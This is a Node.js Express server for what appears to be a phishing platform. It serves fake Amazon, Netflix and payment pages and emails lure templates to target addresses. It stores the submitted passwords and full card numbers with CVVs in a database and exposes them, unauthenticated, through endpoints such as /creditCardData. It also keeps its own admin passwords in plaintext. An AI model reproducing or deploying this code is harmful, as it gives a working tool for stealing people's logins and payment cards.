const express = require('express');
const { Pool } = require('pg');
const path = require('path');
const bcrypt = require('bcrypt');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');

const app = express();
const port = 3010;

const pool = new Pool({ //For PostgreSQL
    user: 'postgres', 
    host: 'localhost',
    database: 'your-database-name',
    password: 'your-password',
    port: 5432
});

const transporter = nodemailer.createTransport({ //For outlook
    host: 'smtp.office365.com',
    port: 587,
    secure: false,
    auth: {
        user: 'your-outlook-address',
        pass: 'your-password', 
    },
    tls: {
        ciphers: 'SSLv3',
    },
});

async function sendEmail(targetEmail, templateContent) {
    const mailOptions = {
        from: 'your-outlook-address', 
        to: targetEmail,
        subject: 'Mail',
        text: templateContent,
    };

    try {
        const info = await transporter.sendMail(mailOptions);
        console.log('E-posta gönderildi:', info.response);
    } catch (error) {
        console.error('E-posta gönderme hatası:', error);
    }
}

app.use(express.json());

app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'login.html'));
});

app.get('/login.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'login.html'));
});

app.get('/dashboard.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'dashboard.html'));
});

app.get('/phishing.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'phishing.html'));
});

app.get('/user_management.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'user_management.html'));
});

app.get('/mail_management.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'mail_management.html'));
});

app.get('/template.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'template.html'));
});

app.get('/logout.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'logout.html'));
});

app.get('/amazon.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'amazon.html'));
});

app.get('/netflix.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'netflix.html'));
});

app.get('/payment.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'payment.html'));
});

app.get('/mostAmazonPhishedUsers', async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM public."LoginPagesData" ORDER BY "FORM_ID" DESC ');
        const data = result.rows;

        const amazonCount = data.filter(row => row.SITE_ID === 1).length;

        res.json({ data, amazonCount });
    } catch (error) {
        console.error('Sorgu hatası:', error);
        res.status(500).json({ error: 'İç Sunucu Hatası' });
    }
});

app.get('/mostNetflixPhishedUsers', async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM public."LoginPagesData" ORDER BY "FORM_ID" DESC ');
        const data = result.rows;

        const amazonCount = data.filter(row => row.SITE_ID === 2).length;

        res.json({ data, amazonCount });
    } catch (error) {
        console.error('Sorgu hatası:', error);
        res.status(500).json({ error: 'İç Sunucu Hatası' });
    }
});

app.post('/login', async (req, res) => {
    try {
        const { username, password } = req.body;

        const result = await pool.query('SELECT * FROM public."User" WHERE "USERNAME" = $1', [username]);

        if (result.rows.length === 1) {
            const storedPassword = result.rows[0].PASSWORD;

            if (password === storedPassword) {
                res.status(200).json({ success: true, message: 'Başarılı giriş.' });
            } else {
                res.status(401).json({ success: false, message: 'Yanlış kullanıcı adı veya şifre.' });
            }
        } else {
            res.status(401).json({ success: false, message: 'Geçersiz kullanıcı adı veya şifre.' });
        }
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ success: false, message: 'İç Sunucu Hatası' });
    }
});

app.get('/amazonData', async (req, res) => {
    try {
        const result = await pool.query('SELECT "EMAIL_OR_PHONE", "PASSWORD" FROM public."LoginPagesData" WHERE "SITE_ID" = 1;');
        const data = result.rows;
        res.json(data);
    } catch (error) {
        console.error('Sorgu hatası:', error);
        res.status(500).json({ error: 'İç Sunucu Hatası' });
    }
});

app.get('/netflixData', async (req, res) => {
    try {
        const result = await pool.query('SELECT "EMAIL_OR_PHONE", "PASSWORD" FROM public."LoginPagesData" WHERE "SITE_ID" = 2;');
        const data = result.rows;
        res.json(data);
    } catch (error) {
        console.error('Sorgu hatası:', error);
        res.status(500).json({ error: 'İç Sunucu Hatası' });
    }
});

app.get('/creditCardData', async (req, res) => {
    try {
        const result = await pool.query('SELECT "NAME_ON_CARD", "CARD_NUMBER", "EXPIRED_DATE", "CVV" FROM public."PaymentFormData";');
        const data = result.rows;
        res.json(data);
    } catch (error) {
        console.error('Sorgu hatası:', error);
        res.status(500).json({ error: 'İç Sunucu Hatası' });
    }
});

app.get('/getSiteName/:siteId', async (req, res) => {
    try {
        const { siteId } = req.params;
        const result = await pool.query('SELECT "SITE_NAME" FROM public."Site" WHERE "SITE_ID" = $1', [siteId]);
        const siteName = result.rows[0].SITE_NAME;
        res.json({ SITE_NAME: siteName });
    } catch (error) {
        console.error('Error fetching site name:', error);
        res.status(500).json({ error: 'Internal Server Error' });
    }
});

app.get('/mostPhishedUsers', async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM public."LoginPagesData" ORDER BY "FORM_ID" DESC ');
        const data = result.rows;
        res.json(data);
    } catch (error) {
        console.error('Sorgu hatası:', error);
        res.status(500).json({ error: 'İç Sunucu Hatası' });
    }
});

app.get('/userRoles', async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM public."UserRole";');
        const roles = result.rows.map(row => row.ROLE);
        res.json(roles);
    } catch (error) {
        console.error('Sorgu hatası:', error);
        res.status(500).json({ error: 'İç Sunucu Hatası' });
    }
});

app.post('/addUser', async (req, res) => {
    try {
        const { username, role, password } = req.body;

        const userRoleID = (role === 'Admin') ? 1 : (role === 'User') ? 2 : null;

        if (userRoleID === null) {
            res.status(400).json({ success: false, message: 'Geçersiz rol.' });
            return;
        }
        const insertUserQuery = 'INSERT INTO public."User" ("ROLE_ID", "USERNAME", "PASSWORD") VALUES ($1, $2, $3)';
        await pool.query(insertUserQuery, [userRoleID, username, password]);

        res.json({ success: true, message: 'Kullanıcı başarıyla eklendi.' });
    } catch (error) {
        console.error('Kullanıcı eklerken hata:', error);
        res.status(500).json({ success: false, message: 'Database İç Sunucu Hatası' });
    }
});

app.get('/emailTemplates', async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM public."EmailTemplates";');
        const templates = result.rows.map(row => row.TEMPLATE_NAME);
        res.json(templates);
    } catch (error) {
        console.error('Error fetching email templates:', error);
        res.status(500).json({ error: 'Internal Server Error' });
    }
});

app.get('/getContent/:templateId', async (req, res) => {
    try {
      const templateId = req.params.templateId;
      const result = await pool.query('SELECT "CONTENT" FROM public."EmailTemplates" WHERE "TEMPLATE_ID" = $1', [templateId]);
      const oldContent = result.rows[0].CONTENT;
      res.json(oldContent);
    } catch (error) {
      console.error('Error fetching template content:', error);
      res.status(500).json({ error: 'Internal Server Error' });
    }
  });
  
  app.post('/addTarget', async (req, res) => {
    try {
        const { email, templateId } = req.body;

        if (!email || !templateId) {
            res.status(400).json({ success: false, message: 'Invalid email or templateId.' });
            return;
        }

        const insertTargetQuery = 'INSERT INTO public."Targets" ("TARGET_EMAIL", "TEMPLATE_ID") VALUES ($1, $2)';
        await pool.query(insertTargetQuery, [email, templateId]);

        const templateResponse = await pool.query('SELECT "CONTENT" FROM public."EmailTemplates" WHERE "TEMPLATE_ID" = $1', [templateId]);
        const templateContent = templateResponse.rows[0].CONTENT;

        sendEmail(email, templateContent);

        res.json({ success: true, message: 'Target added successfully.' });
    } catch (error) {
        console.error('Error adding target:', error);
        res.status(500).json({ success: false, message: 'Internal Server Error' });
    }
});

app.post('/updateTemplateContent', async (req, res) => {
    try {
      const { templateId, content } = req.body;
  
      const updateQuery = 'UPDATE public."EmailTemplates" SET "CONTENT" = $1 WHERE "TEMPLATE_ID" = $2';
      await pool.query(updateQuery, [content, templateId]);
  
      res.json({ success: true, message: 'Template content updated successfully.' });
    } catch (error) {
      console.error('Error updating template content:', error);
      res.status(500).json({ success: false, message: 'Internal Server Error' });
    }
  });

app.post('/addAmazonTarget', async (req, res) => {
    try {
        const { email, password } = req.body;
        const siteId = 1;

        if (!email || !password) {
            res.status(400).json({ success: false, message: 'Geçersiz email veya şifre.' });
            return;
        }

        const insertLoginQuery = 'INSERT INTO public."LoginPagesData" ("SITE_ID", "EMAIL_OR_PHONE", "PASSWORD", "CLICK_ID") VALUES ($1, $2, $3, $4)';
        await pool.query(insertLoginQuery, [siteId, email, password, 4]);

        res.json({ success: true, message: 'Giriş verisi başarıyla eklendi.' });
    } catch (error) {
        console.error('Giriş verisi eklerken hata:', error);
        res.status(500).json({ success: false, message: 'İç Sunucu Hatası' });
    }
});

app.post('/addNetflixTarget', async (req, res) => {
    try {
        const { username, password } = req.body;

        if (username && password) {
            const insertLoginQuery = 'INSERT INTO public."LoginPagesData" ("SITE_ID", "EMAIL_OR_PHONE", "PASSWORD", "CLICK_ID") VALUES ($1, $2, $3, $4)';
            await pool.query(insertLoginQuery, [2, username, password, 1]);

            res.json({ success: true, message: 'Kullanıcı başarıyla eklendi.' });
        } else {
            res.status(401).json({ success: false, message: 'Invalid username or password.' });
        }
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ success: false, message: 'Internal Server Error' });
    }
});

app.post('/addPaymentTarget', async (req, res) => {
    try {
        const { nameOnCard, cardNumber, expiredDate, cvv } = req.body;

        // Validate the input
        if (!nameOnCard || !cardNumber || !expiredDate || !cvv) {
            res.status(400).json({ success: false, message: 'Invalid payment data.' });
            return;
        }

        // Insert payment data into the 'PaymentPagesData' table
        const insertPaymentQuery = 'INSERT INTO public."PaymentFormData" ("NAME_ON_CARD", "CARD_NUMBER", "EXPIRED_DATE", "CVV", "CLICK_ID") VALUES ($1, $2, $3, $4, $5)';
        await pool.query(insertPaymentQuery, [nameOnCard, cardNumber, expiredDate, cvv, 1]);

        res.json({ success: true, message: 'Payment data added successfully.' });
    } catch (error) {
        console.error('Error adding payment data:', error);
        res.status(500).json({ success: false, message: 'Internal Server Error' });
    }
});

app.get('/engagedCategoriesCount', async (req, res) => {
    try {
        const amazonResult = await pool.query('SELECT COUNT(*) FROM public."LoginPagesData" WHERE "SITE_ID" = 1');
        const netflixResult = await pool.query('SELECT COUNT(*) FROM public."LoginPagesData" WHERE "SITE_ID" = 2');
        const paymentResult = await pool.query('SELECT COUNT(*) FROM public."PaymentFormData"');

        const amazonCount = amazonResult.rows[0].count;
        const netflixCount = netflixResult.rows[0].count;
        const paymentCount = paymentResult.rows[0].count;

        res.json({ amazonCount, netflixCount, paymentCount });
    } catch (error) {
        console.error('Sorgu hatası:', error);
        res.status(500).json({ error: 'İç Sunucu Hatası' });
    }
});

// Sunucuyu başlat
app.listen(port, () => {
    console.log(`Sunucu şu adreste çalışıyor: http://localhost:${port}`);
});
